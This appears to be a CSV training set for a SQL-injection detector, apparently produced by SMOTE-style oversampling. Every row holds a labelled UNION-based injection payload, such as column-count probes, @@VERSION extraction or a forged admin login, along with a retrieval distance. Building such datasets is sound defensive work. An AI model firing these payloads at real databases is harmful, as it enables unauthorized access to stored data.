id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000199,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,0.2663603995132288
SMOTE_000200,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,0.38774327332271347
SMOTE_000201,attack,union,"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",nearest_attack_euclidean,R000121,0.10098088565703672
SMOTE_000202,attack,union,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",nearest_attack_euclidean,R000072,0.39237817469682756
SMOTE_000203,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,0.038372469994378065
SMOTE_000204,attack,union,"1""  )   where 5870  =  5870 union all select null,null,null--",nearest_attack_euclidean,R000111,0.23575200174180333
SMOTE_000205,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000003,0.8572324758597605
SMOTE_000206,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000076,0.6533012757911403
SMOTE_000207,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,0.5463865240137323
SMOTE_000208,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,0.4324472538474594
SMOTE_000209,attack,union,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",nearest_attack_euclidean,R000072,1.1971510957187086
SMOTE_000210,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000115,1.8661190472120144
SMOTE_000211,attack,union," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",nearest_attack_euclidean,R000022,2.451567574224261
SMOTE_000212,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000028,1.0839677534712577
SMOTE_000213,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000153,1.7002277234649723
SMOTE_000214,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000095,0.10343175700486304
SMOTE_000215,attack,union,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",nearest_attack_euclidean,R000081,0.8079123987468751
SMOTE_000216,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000037,0.0814482890206468
SMOTE_000217,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000076,1.2381573190974342
SMOTE_000218,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000095,0.46225569160793806
SMOTE_000219,attack,union,-3666'  )   where 6386  =  6386 union all select 6386--,nearest_attack_euclidean,R000093,0.11653289335577807
SMOTE_000220,attack,union,-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,nearest_attack_euclidean,R000139,1.6651334559558288
SMOTE_000221,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000136,0.9781550678053816
SMOTE_000222,attack,union,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",nearest_attack_euclidean,R000065,0.2568587013769103
SMOTE_000223,attack,union,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",nearest_attack_euclidean,R000070,0.25172783384645075
SMOTE_000224,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,0.06374999132641397
SMOTE_000225,attack,union,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",nearest_attack_euclidean,R000140,0.3927156140052411
SMOTE_000226,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000131,0.596969958819675
SMOTE_000227,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000109,0.3472549572105573
SMOTE_000228,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000100,0.6304091932867717
SMOTE_000229,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000117,1.3341080008635995
SMOTE_000230,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000091,0.08239350215335127
SMOTE_000231,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000035,0.2583062263481565
SMOTE_000232,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000092,0.34475166208418845
SMOTE_000233,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000119,0.512680245849115
SMOTE_000234,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,0.7124680877511684
SMOTE_000235,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000153,1.8371705884094058
SMOTE_000236,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,0.3244258901822047
SMOTE_000237,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000080,0.48475263486381565
SMOTE_000238,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,1.1001433504733875
SMOTE_000239,attack,union,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",nearest_attack_euclidean,R000128,0.7210651872460048
SMOTE_000240,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,1.7034904187662883
SMOTE_000241,attack,union,"1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#",nearest_attack_euclidean,R000085,1.2830871608115337
SMOTE_000242,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,0.2237918213667787
SMOTE_000243,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,0.053986223318398176
SMOTE_000244,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000042,0.0040403204131006076
SMOTE_000245,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000050,0.05215431106750771
SMOTE_000246,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000054,0.12025418358768011
SMOTE_000247,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000018,0.15137346437942237
SMOTE_000248,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000047,1.4242583119844567
SMOTE_000249,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,1.381341428976528
SMOTE_000250,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000076,0.9811855528663456
SMOTE_000251,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000035,0.5406027367664705
SMOTE_000252,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,0.16478574214479264
SMOTE_000253,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000005,0.11931334891066446
SMOTE_000254,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000004,2.6226013293266335
SMOTE_000255,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000100,0.11789386508204507
SMOTE_000256,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000067,0.3534042108715888
SMOTE_000257,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000003,0.27441260168752374
SMOTE_000258,attack,union,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",nearest_attack_euclidean,R000073,0.7108689560965431
SMOTE_000259,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,0.15107782244568416
SMOTE_000260,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,0.10771705066091053
SMOTE_000261,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000113,0.4042026720380832
SMOTE_000262,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000124,0.008257324903740712
SMOTE_000263,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,1.9468390081009648
SMOTE_000264,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000041,0.5587394435787645
SMOTE_000265,attack,union,"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",nearest_attack_euclidean,R000121,0.8520922823171488
SMOTE_000266,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000035,0.046516110350383805
SMOTE_000267,attack,union," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000017,0.0076743945694075725
SMOTE_000268,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000013,2.6050834911064786
SMOTE_000269,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,0.0672499244723556
SMOTE_000270,attack,union,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",nearest_attack_euclidean,R000128,1.49964517608033
SMOTE_000271,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,0.45136490900663817
SMOTE_000272,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000095,0.6640457089293516
SMOTE_000273,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000026,0.7275365278816556
SMOTE_000274,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000097,1.146662314392245
SMOTE_000275,attack,union,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",nearest_attack_euclidean,R000070,0.16400059440758813
SMOTE_000276,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000067,0.035574860828906214
SMOTE_000277,attack,union,"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",nearest_attack_euclidean,R000071,1.1067745967173974
SMOTE_000278,attack,union,"1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#",nearest_attack_euclidean,R000085,0.1458555015927432
SMOTE_000279,attack,union," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",nearest_attack_euclidean,R000002,1.0035216880445834
SMOTE_000280,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,0.01800720054646719
SMOTE_000281,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000044,0.8033712858601902
SMOTE_000282,attack,union,1'  )   as zmvn where 2887  =  2887 union all select null--,nearest_attack_euclidean,R000127,0.7327352291130539
SMOTE_000283,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000031,0.6102797848813569
SMOTE_000284,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,0.987824895473335
SMOTE_000285,attack,union,-4965  )   as imga where 3705  =  3705 union all select 3705--,nearest_attack_euclidean,R000122,0.6749493586024683
SMOTE_000286,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,1.6313718226781242
SMOTE_000287,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000012,1.0537207784696858
SMOTE_000288,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,0.5872987533729871
SMOTE_000289,attack,union,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",nearest_attack_euclidean,R000070,0.7845405361163211
SMOTE_000290,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000035,0.45882206170237544
SMOTE_000291,attack,union,"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",nearest_attack_euclidean,R000106,1.4020075010897732
SMOTE_000292,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000041,0.39229800203798504
SMOTE_000293,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000011,0.6214732168412405
SMOTE_000294,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000155,4.658467027623051
SMOTE_000295,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,0.33609363475421555
SMOTE_000296,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000051,1.4408003722669422
SMOTE_000297,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000056,0.6984145452820762
SMOTE_000298,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000041,1.3977494579244318
SMOTE_000299,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000051,1.4585509260508234
SMOTE_000300,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000112,1.8256301482058228
SMOTE_000301,attack,union,1'  )   as zmvn where 2887  =  2887 union all select null--,nearest_attack_euclidean,R000127,0.4217762092741585
SMOTE_000302,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000031,0.02952988877286082
SMOTE_000303,attack,union,"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",nearest_attack_euclidean,R000069,0.11953859212822833
SMOTE_000304,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000066,1.4761535918950996
SMOTE_000305,attack,union,"-8651""  )   where 8391  =  8391 union all select 8391,8391#",nearest_attack_euclidean,R000087,0.6886374692018027
SMOTE_000306,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,1.7656452078018696
SMOTE_000307,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000141,0.1943218800091248
SMOTE_000308,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,1.8594050714641985
SMOTE_000309,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,0.4764280829620094
SMOTE_000310,attack,union,"1 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000152,0.9541190975811235
SMOTE_000311,attack,union,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",nearest_attack_euclidean,R000102,0.3216645263302614
SMOTE_000312,attack,union,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",nearest_attack_euclidean,R000128,0.4454919698515102
SMOTE_000313,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000100,0.34755227756274554
SMOTE_000314,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000016,2.5131015999047657
SMOTE_000315,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000109,0.6634656649593851
SMOTE_000316,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000004,4.746389120076405
SMOTE_000317,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000097,0.6145575412822782
SMOTE_000318,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000150,0.013571214541106002
SMOTE_000319,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000056,0.4452319743667541
SMOTE_000320,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000117,1.4280142724246596
SMOTE_000321,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000155,2.067047072094254
SMOTE_000322,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000025,0.4168855962305776
SMOTE_000323,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,0.08096215922578895
SMOTE_000324,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,1.0234751098054415
SMOTE_000325,attack,union,"-3300' union all select 8979,8979,8979,8979,8979,8979--",nearest_attack_euclidean,R000134,0.47437443962906545
SMOTE_000326,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000076,1.2522454012153477
SMOTE_000327,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.4169080889784667
SMOTE_000328,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000026,0.6600861940270785
SMOTE_000329,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000118,0.17009213318953537
SMOTE_000330,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000098,0.9461680709027808
SMOTE_000331,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000104,0.0170901861898261
SMOTE_000332,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,0.18963882653615927
SMOTE_000333,attack,union,1'   )    )    as vwua where 8099  =  8099 union all select null--,nearest_attack_euclidean,R000039,1.4767271837434597
SMOTE_000334,attack,union," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",nearest_attack_euclidean,R000022,2.0059138399404564
SMOTE_000335,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,1.4913168745442755
SMOTE_000336,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,0.5458464058784109
SMOTE_000337,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000109,0.1734269206861008
SMOTE_000338,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000035,1.0732065872558083
SMOTE_000339,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.6973782532882463
SMOTE_000340,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000078,0.5106172224608067
SMOTE_000341,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.7383331133422116
SMOTE_000342,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000142,0.8120683011346699
SMOTE_000343,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,1.7123275734590098
SMOTE_000344,attack,union,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",nearest_attack_euclidean,R000070,0.031370804815679894
SMOTE_000345,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,1.0222085532190175
SMOTE_000346,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,0.10378127952450246
SMOTE_000347,attack,union,"1 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000152,0.6479258990355652
SMOTE_000348,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000117,1.1563110889646042
SMOTE_000349,attack,union," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",nearest_attack_euclidean,R000002,1.8316449374834012
SMOTE_000350,attack,union,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",nearest_attack_euclidean,R000081,0.002835798598525864
SMOTE_000351,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,1.7097945476112275
SMOTE_000352,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000098,0.17331036386421877
SMOTE_000353,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000015,0.012689400732209902
SMOTE_000354,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000092,1.044230925983767
SMOTE_000355,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000098,1.4685775454590309
SMOTE_000356,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,0.7596823242496946
SMOTE_000357,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000066,2.296434341985034
SMOTE_000358,attack,union,"-9937'   )    )    union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",nearest_attack_euclidean,R000123,0.7377711010546081
SMOTE_000359,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,0.8148743841240011
SMOTE_000360,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000089,1.0692104454641294
SMOTE_000361,attack,union," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000007,1.6546697257427234
SMOTE_000362,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,1.1174873992027248
SMOTE_000363,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000104,0.22310119085358582
SMOTE_000364,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,0.363594412606782
SMOTE_000365,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000117,0.7794921570169059
SMOTE_000366,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000054,0.5223825769353229
SMOTE_000367,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000042,0.6805331144279362
SMOTE_000368,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,0.34611851368551455
SMOTE_000369,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000104,0.4808115633362
SMOTE_000370,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000051,0.6203151078482999
SMOTE_000371,attack,union,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",nearest_attack_euclidean,R000070,0.09864091147088022
SMOTE_000372,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.19840594810260756
SMOTE_000373,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000043,0.5865266924520268
SMOTE_000374,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000053,0.30943163551302094
SMOTE_000375,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000005,0.011433261560379797
SMOTE_000376,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000026,0.6471191308867354
SMOTE_000377,attack,union," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",nearest_attack_euclidean,R000002,1.4300941205417155
SMOTE_000378,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000047,0.1158627899255458
SMOTE_000379,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,0.9315697594851029
SMOTE_000380,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000104,0.36350397236945375
SMOTE_000381,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000005,0.2390030379409624
SMOTE_000382,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000041,1.835645861095567
SMOTE_000383,attack,union,"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",nearest_attack_euclidean,R000106,1.490862161387135
SMOTE_000384,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.7382407223215475
SMOTE_000385,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000097,0.14155412378463753
SMOTE_000386,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,1.1366928988028941
SMOTE_000387,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000132,1.0465749830830973
SMOTE_000388,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000043,1.1222248092743368
SMOTE_000389,attack,union,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",nearest_attack_euclidean,R000081,0.9283016964879302
SMOTE_000390,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000060,1.3794334843088567
SMOTE_000391,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000042,1.1401632360486158
SMOTE_000392,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.35893014289564296
SMOTE_000393,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000120,0.8024301494034212
SMOTE_000394,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000089,0.8113366395531136
SMOTE_000395,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,0.3916936716049612
